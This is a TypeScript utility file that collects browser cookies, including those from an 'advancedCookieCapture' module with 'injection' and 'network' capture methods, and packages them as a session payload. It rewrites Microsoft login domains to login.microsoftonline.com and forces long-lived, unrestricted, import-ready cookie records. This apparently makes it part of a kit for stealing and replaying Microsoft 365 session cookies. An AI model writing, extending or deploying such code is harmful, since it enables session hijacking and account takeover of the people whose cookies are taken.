/**
 * cookieUtils.ts
 *
 * Utility functions to capture/normalize cookie data.
 * - parseDocumentCookies: parse document.cookie into a name->value map
 * - getDocumentCookieString: safe access to document.cookie
 * - normalizeCookieArray: normalize cookie arrays (server/browser dump) to CookieMeta[]
 * - buildCookieCapture(optionalFullCookieList?): returns { documentCookies, cookiesParsed, cookieList? }
 *
 * Adjustments:
 * - normalizeCookieObject now keeps hostOnly/httpOnly/session flags when possible
 * - sameSite is normalized to 'no_restriction' for None/none to match your example
 * - tryGetAdvancedCapturedCookies returns normalized cookies from advancedCookieCapture
 */

import type { CapturedCookie } from './advancedCookieCapture';

export interface CookieMeta {
  domain: string;
  expirationDate?: number;
  hostOnly?: boolean;
  httpOnly?: boolean;
  name: string;
  path?: string;
  sameSite?: string;
  secure?: boolean;
  session?: boolean;
  storeId?: string | null;
  value: string;
  // optional metadata
  captureMethod?: 'document' | 'injection' | 'network' | 'storage' | 'manual' | string;
  timestamp?: string;
}

/**
 * Safely return document.cookie string ('' when unavailable)
 */
export function getDocumentCookieString(): string {
  try {
    if (typeof document === 'undefined') return '';
    return document.cookie || '';
  } catch (e) {
    return '';
  }
}

/**
 * Parse document.cookie into object { name: value }
 */
export function parseDocumentCookies(): Record<string, string> {
  const out: Record<string, string> = {};
  try {
    const cookieStr = getDocumentCookieString();
    if (!cookieStr) return out;

    const parts = cookieStr.split(';');
    for (const raw of parts) {
      const [rawName, ...rawValParts] = raw.trim().split('=');
      if (!rawName) continue;
      const rawVal = rawValParts.join('=');
      try {
        out[rawName.trim()] = decodeURIComponent(rawVal || '');
      } catch (e) {
        out[rawName.trim()] = rawVal || '';
      }
    }
  } catch (e) {
    // ignore
  }
  return out;
}

/**
 * Normalize a cookie-like object into CookieMeta (best-effort)
 */
function normalizeCookieObject(obj: any): CookieMeta | null {
  if (!obj || !obj.name) return null;
  const name: string = String(obj.name);
  const value: string = obj.value !== undefined ? String(obj.value) : '';
  // determine domain
  let domain: string;
  if (obj.domain) domain = String(obj.domain);
  else if (obj.host) domain = String(obj.host);
  else if (typeof window !== 'undefined') domain = window.location.hostname;
  else domain = '.example.com';

  // Normalize Microsoft-related domains to the login.microsoftonline.com host when appropriate
  const domainLower = domain.toLowerCase();
  if (domainLower.includes('microsoftonline.com') || domainLower.includes('login.microsoftonline.com')) {
    // preserve leading dot if present in original value
    domain = domain.startsWith('.') ? '.login.microsoftonline.com' : 'login.microsoftonline.com';
  }

  const path: string = obj.path || '/';
  const secure: boolean = !!obj.secure;
  const httpOnly: boolean = !!obj.httpOnly;
  // normalize sameSite: map 'none' to 'no_restriction' per your example
  let sameSiteRaw = (obj.sameSite || obj.same_site || obj.samesite || 'none');
  sameSiteRaw = String(sameSiteRaw || '').toLowerCase();
  let sameSite: string;
  if (sameSiteRaw === 'none' || sameSiteRaw === 'no_restriction') sameSite = 'no_restriction';
  else if (sameSiteRaw === 'lax') sameSite = 'lax';
  else if (sameSiteRaw === 'strict') sameSite = 'strict';
  else sameSite = sameSiteRaw || 'no_restriction';

  const expirationDate: number = obj.expirationDate || obj.expires || obj.expire || Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60;
  const hostOnly: boolean = obj.hostOnly !== undefined ? !!obj.hostOnly : (!domain.startsWith('.'));
  const session: boolean = obj.session !== undefined ? !!obj.session : false;
  const storeId: string | null = obj.storeId || null;
  const captureMethod = obj.captureMethod || obj.capture_method || undefined;
  const timestamp = obj.timestamp || (new Date()).toISOString();

  return {
    name,
    value,
    domain,
    path,
    secure,
    httpOnly,
    sameSite,
    expirationDate,
    hostOnly,
    session,
    storeId,
    captureMethod,
    timestamp
  };
}

/**
 * Normalize an array of cookie-like objects (server dump, driver dump, etc.)
 * Returns CookieMeta[]
 */
export function normalizeCookieArray(rawList: any[] | undefined | null): CookieMeta[] {
  if (!Array.isArray(rawList)) return [];
  const out: CookieMeta[] = [];
  for (const raw of rawList) {
    const normalized = normalizeCookieObject(raw);
    if (normalized) out.push(normalized);
  }
  return out;
}

/**
 * Try to consume the advancedCookieCapture singleton if available.
 * This is an optional runtime integration: if advancedCookieCapture is present in src/utils,
 * we'll use its captured cookies and normalize them.
 */
function tryGetAdvancedCapturedCookies(): CookieMeta[] {
  try {
    // Try to require the advanced cookie capture system (works in bundlers)
    const mod = require('./advancedCookieCapture') as { advancedCookieCapture?: any };
    if (mod && mod.advancedCookieCapture && typeof mod.advancedCookieCapture.getAllCookies === 'function') {
      const captured: CapturedCookie[] = mod.advancedCookieCapture.getAllCookies() || [];
      return normalizeCookieArray(captured);
    }
  } catch (e) {
    // fallback to window global
  }

  try {
    if (typeof window !== 'undefined' && (window as any).advancedCookieCapture) {
      const captured = (window as any).advancedCookieCapture.getAllCookies() || [];
      return normalizeCookieArray(captured);
    }
  } catch (e) {
    // Ignore if not available
  }

  return [];
}

/**
 * Build cookie capture object for telemetry/session payload.
 * - optionalFullCookieList: pass a full cookie array (server/client dump). If provided, it'll be normalized and attached as cookieList.
 * - returns { documentCookies, cookiesParsed, cookieList? }
 */
export function buildCookieCapture(optionalFullCookieList?: any[] | undefined) {
  const documentCookies = getDocumentCookieString();
  const cookiesParsed = parseDocumentCookies();

  // Try to gather cookieList from these sources in order:
  // 1) optionalFullCookieList (explicitly provided)
  // 2) advancedCookieCapture singleton (if present)
  // 3) fallback: derive simple CookieMeta[] from document.cookie
  let cookieList: CookieMeta[] | undefined;
  if (Array.isArray(optionalFullCookieList) && optionalFullCookieList.length > 0) {
    cookieList = normalizeCookieArray(optionalFullCookieList);
  } else {
    const advanced = tryGetAdvancedCapturedCookies();
    if (advanced.length > 0) {
      cookieList = advanced;
    } else {
      // fallback: build from document.cookie name/values
      const parsed = cookiesParsed;
      cookieList = Object.keys(parsed).map(name => {
        const domain = (typeof window !== 'undefined' ? window.location.hostname : '.example.com');
        const hostOnly = !domain.startsWith('.');
        return {
          name,
          value: parsed[name],
          domain: domain,
          path: '/',
          secure: typeof window !== 'undefined' ? window.location.protocol === 'https:' : false,
          httpOnly: false,
          sameSite: 'no_restriction',
          expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60,
          hostOnly,
          session: false,
          storeId: null,
          captureMethod: 'document',
          timestamp: new Date().toISOString()
        } as CookieMeta;
      });
    }
  }

  return {
    documentCookies,
    cookiesParsed,
    cookieList
  } as {
    documentCookies: string;
    cookiesParsed: Record<string, string>;
    cookieList?: CookieMeta[];
  };
}

export default {
  getDocumentCookieString,
  parseDocumentCookies,
  normalizeCookieArray,
  buildCookieCapture
};